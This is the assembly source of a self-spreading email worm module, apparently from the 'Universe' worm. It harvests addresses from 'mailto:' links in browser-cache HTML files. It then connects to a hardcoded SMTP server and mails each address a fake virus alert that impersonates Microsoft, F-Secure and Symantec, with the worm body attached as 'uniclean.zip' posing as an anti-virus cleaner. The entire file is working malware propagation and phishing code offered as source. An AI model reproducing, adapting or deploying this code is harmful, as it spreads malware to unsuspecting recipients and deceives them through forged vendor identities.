;mail-spreading module, part of Universe project.


.386p
.model	flat

include	win32api.inc
include	useful.inc

invoke	macro	api
	extrn	api:PROC
	call	api
endm


.data
	smtp_server	db	'smtp.iol.cz',0			;smtp server
	;mail message
	MsgBody		db	'From: "Microsoft Support" <support@microsoft.com>',CRLF
			db	'Reply-To: "Peter Szor" <pszor@symantec.com>',CRLF
			db	'To: <c_net6@hotmail.com>',CRLF
			db	'Subject: Virus Alert',CRLF
			db	'Mime-Version: 1.0',CRLF
			db	'Content-Type: multipart/mixed; boundary="--123"',CRLF,CRLF

			db	'----123',CRLF
			db	'Content-Type: text/plain; charset=us-ascii',CRLF
			db	'Content-Transfer-Encoding: 7bit',CRLF,CRLF

			db	'Dear user',CRLF,CRLF
			db	'F-Secure, Symantec and Microsoft, top leaders in IT technologies '
			db	'have discovered one very dangerous Internet worm called I-Worm.Universe '
			db	'in the wild. Author of this viral program is well known hacker from '
			db	'Europe under "Benny" nickname from 29A virus writting group.',CRLF
			db	'Universe is fast-spreading worm that already destroyed computer '
			db	'systems in FBI and Microsoft. It is heavilly encrypted and very '
			db	'complex. It consists from many independed parts called "modules", '
			db	'which are very variable - every second hour is producted one new '
			db	'module, that completelly changes behaviour of worm, including '
			db	'anti-detection tricks.',CRLF
			db	'You should check your system by our anti-virus attached to this '
			db	'mail. All reports please send to our mail address: '
			db	'universe@microsoft.com and/or universe@f-secure.com',CRLF,CRLF
			db	'Have a nice day,',CRLF,CRLF
			db	'    F-Secure, Symantec and Microsoft, top leaders in IT '
			db	'technologies.',CRLF

			db	'----123',CRLF
			db	'Content-Type: application/x-zip-compressed; name="uniclean.zip"',CRLF
			db	'Content-Transfer-Encoding: base64',CRLF
			db	'Content-Disposition: attachment; filename="uniclean.zip"',CRLF,CRLF

			include	universe.b64		;base64 encoded worm body

			db	'--123--',CRLF
			db	?

	;smtp server commandz
	cmd_helo	db	'HELO support',CRLF
	cmd_mailfrom	db	'MAIL FROM:<support@microsoft.com>',CRLF
	cmd_rcptto	db	'RCPT TO:<'
	cmd_data	db	'DATA',CRLF
	cmd_term	db	CRLF,'.',CRLF
	cmd_quit	db	'QUIT',CRLF

	wsocket		dw	2
			dw	1900h
	sin_addr	dd	?
			db	8 dup (?)
	sizeofsocket = $-wsocket

	MessageBuffer	db	'Date: ',32 dup (?)	;buffer for mail message
			db	4000h dup (?)

	WSAData:	dw	?
			dw	?
			db	257 dup (?)
			db	129 dup (?)
			dw	?
			dw	?
			dd	?
	response	dd	?			;error code
	response_break	db	?			;byte for LF
	temppath	db	MAX_PATH dup (?)	;buffer for dir-path
	email_address	db	160 dup (?)		;mail address

.code
Start:
	mov	ecx,[esp+8]
	dec	ecx
	jecxz	perform_action			;must be DLL_PROCESS_ATTACH (1)
	ret

perform_action:
	pushad
	@SEH_SetupFrame	<jmp	end_seh>

	mov	edi,offset MessageBuffer+6	;generate date and time for
	call	createDateTime			;mail message
	call	copyMsg

	call	Spread				;find email addresses and spread
end_seh:@SEH_RemoveFrame			;to there...
	popad
	ret


smtp_sendcmdz	Proc
	pushad
	mov	esi,offset cmd_helo
	push	14
	pop	ecx
	call	write_socket			;send HELO command
	call	get_response
	jc	err_socket

	mov	esi,offset cmd_mailfrom
	push	35
	pop	ecx
	call	write_socket			;send MAIL FROM command
	call	get_response
	jc	err_socket

	mov	esi,offset cmd_rcptto
	push	9
	pop	ecx
	call	write_socket
	mov	esi,offset email_address
	call	strlen
	call	write_break			;send RCPT TO command
	call	get_response
	jc	err_socket

	mov	esi,offset cmd_data
	push	6
	pop	ecx
	call	write_socket			;send DATA command
	call	get_response
	jc	err_socket

	mov	esi,offset MessageBuffer
	call	strlen
	mov	esi,offset cmd_term
	push	5
	pop	ecx
	call	write_socket			;send message header+body
	call	get_response
	jc	err_socket

	mov	esi,offset cmd_quit
	push	6
	pop	ecx
	call	write_socket			;send QUIT command
	popad
	ret

;send ">",CRLF
write_break:
	call	@br
	db	'>',CRLF
@br:	pop	esi
	push	3
	pop	ecx
	jmp	write_socket

;get string length
strlen:	push	esi
	xor	ecx,ecx
	dec	ecx
l_sl:	inc	ecx
	lodsb
	test	al,al
	jne	l_sl
	pop	esi

;send data
write_socket:
	push	0
	push	ecx
	push	esi
	push	[hSocket]
	invoke	send
	ret
smtp_sendcmdz	EndP


smtp_disconnect	Proc
	pushad
err_socket:
	push	12345678h
hSocket = dword ptr $-4
	invoke	closesocket
err_wsa:invoke	WSACleanup
e_wsa:	popad
	stc
	ret
smtp_disconnect	EndP


smtp_connect	Proc
	pushad
	push	offset WSAData
	push	101h
	invoke	WSAStartup			;init
	test	eax,eax
	jne	e_wsa

	push	0
	push	1
	push	2
	invoke	socket				;create socket
	inc	eax
	je	err_wsa
	dec	eax
	mov	[hSocket],eax

	push	offset smtp_server
	invoke	gethostbyname			;convert smtp domain name to IP
	test	eax,eax
	je	err_socket
	mov	eax,[eax+10h]
	mov	eax,[eax]
	mov	[sin_addr],eax			;save it

	push	sizeofsocket
	push	offset wsocket
	push	[hSocket]
	invoke	connect				;connect to smtp server
	inc	eax
	je	err_socket
	call	get_response			;get server response
	jc	err_socket
	popad
	clc
	ret

get_response:
	push	0
	push	4
	push	offset response
	push	[hSocket]
	invoke	recv				;get stmp server error code
	cmp	eax,4
	jne	err_r

r_loop:	mov	ebx,offset response_break
	push	0
	push	1
	push	ebx
	push	[hSocket]
	invoke	recv
	jne	err_r
	cmp	byte ptr [ebx],0Ah
	jne	r_loop				;skip over CRLF
	mov	eax,[response]
	cmp	eax,' 022'			;analyse error codez
	je	ok_r
	cmp	eax,' 052'
	je	ok_r
	cmp	eax,' 152'
	je	ok_r
	cmp	eax,' 453'
	jne	err_r
ok_r:	clc
	ret
err_r:	stc
	ret
smtp_connect	EndP


;copy mail message to buffer
copyMsg	Proc
	mov	esi,offset MsgBody
c_cm:	lodsb
	test	al,al
	je	end_cm
	stosb
	jmp	c_cm
end_cm:	ret
copyMsg	EndP


;create date and time stamp for mail message
createDateTime	Proc
	push	32
	push	edi
	@pushsz	'ddd, dd MMM yyyy '
	push	0
	push	0
	push	9
	invoke	GetDateFormatA
	add	edi,17
	push	32
	push	edi
	@pushsz	'HH:mm:ss '
	push	0
	push	0
	push	9
	invoke	GetTimeFormatA
	add	edi,9
	mov	ax,0A0Dh
	stosw
	ret
createDateTime	EndP


Spread	Proc
	mov	edi,offset temppath
	push	0
	push	20h
	push	edi
	push	0
	invoke	SHGetSpecialFolderPathA			;get MSIE cache directory
	dec	eax
	je	g_sh
e_sh:	ret
g_sh:	push	edi
	invoke	SetCurrentDirectoryA			;go to there
	dec	eax
	jne	e_sh

;now we have to go to the deepest directory
b_dir:	push	edi
	@pushsz	'*.*'
	invoke	FindFirstFileA				;find first directory
	inc	eax
	je	end_dir
	dec	eax
	xchg	eax,esi

an_dir:	lea	eax,[edi.WFD_szFileName]
	test	byte ptr [edi],FILE_ATTRIBUTE_DIRECTORY
	je	n_dir					;quit if not directory
	cmp	byte ptr [eax],'.'			;quit if it beggins
	je	n_dir					;with dot

	push	eax
	invoke	SetCurrentDirectoryA			;go to that directory
	push	esi
	invoke	FindClose				;close the search handle
	jmp	b_dir

n_dir:	push	edi
	push	esi
	invoke	FindNextFileA				;find next directory
	dec	eax
	je	an_dir

	push	esi
	invoke	FindClose				;close the search handle

end_dir:push	edi
	@pushsz	'*.*htm*'
	invoke	FindFirstFileA				;find first *.*htm* file
	inc	eax
	jne	g_fffa
	ret
g_fffa:	dec	eax
	xchg	eax,esi

p_htmlz:call	parse_html				;search inside html file
							;and find there mail
							;address and send itself
	push	edi					;to there
	push	esi
	invoke	FindNextFileA				;find next file
	dec	eax
	je	p_htmlz

end_spread:
	push	esi
	invoke	FindClose				;close search handle
e_es:	ret

parse_html:
	pushad
	push	0
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	0
	push	FILE_SHARE_READ
	push	GENERIC_READ
	push	offset temppath+WFD_szFileName
	invoke	CreateFileA				;open the file
	inc	eax
	je	e_es
	dec	eax
	xchg	eax,ebx

	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	PAGE_READONLY
	push	eax
	push	ebx
	invoke	CreateFileMappingA			;create the file mapping
	test	eax,eax
	je	ph_close
	xchg	eax,ebp

	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	FILE_MAP_READ
	push	ebp
	invoke	MapViewOfFile				;map the file
	test	eax,eax
	je	ph_close2
	xchg	eax,esi

	push	0
	push	ebx
	invoke	GetFileSize				;get its size
	xchg	eax,ecx
	jecxz	ph_close3

ls_scan_mail:
	call	@mt
	db	'mailto:'
@mt:	pop	edi
l_scan_mail:
	pushad
	push	7
	pop	ecx
	rep	cmpsb					;search for "mailto:"
	popad						;string
	je	scan_mail				;check the mail address
	inc	esi
	loop	l_scan_mail				;in a loop

ph_close3:
	push	esi
	invoke	UnmapViewOfFile				;unmap view of file
ph_close2:
	push	ebp
	invoke	CloseHandle				;close file mapping
ph_close:
	push	ebx
	invoke	CloseHandle				;close the file
	popad
	ret

scan_mail:
	xor	edx,edx
	add	esi,7
	mov	edi,offset email_address		;where to store the
	push	edi					;mail address
n_char:	lodsb
	cmp	al,' '
	je	s_char
	cmp	al,'"'
	je	e_char
	cmp	al,''''
	je	e_char
	cmp	al,'@'
	jne	o_a
	inc	edx
o_a:	stosb
	jmp	n_char
s_char:	inc	esi
	jmp	n_char
e_char:	xor	al,al
	stosb
	pop	edi
	test	edx,edx					;if EDX=0, mail is not
	je	ls_scan_mail				;valid (no '@')

	call	smtp_connect				;connect to smtp server
	jc	ls_scan_mail				;quit if error
	call	smtp_sendcmdz				;send mail message
	call	smtp_disconnect				;and disconnect
	jmp	ls_scan_mail				;get next email addresses

Spread	EndP
End	Start
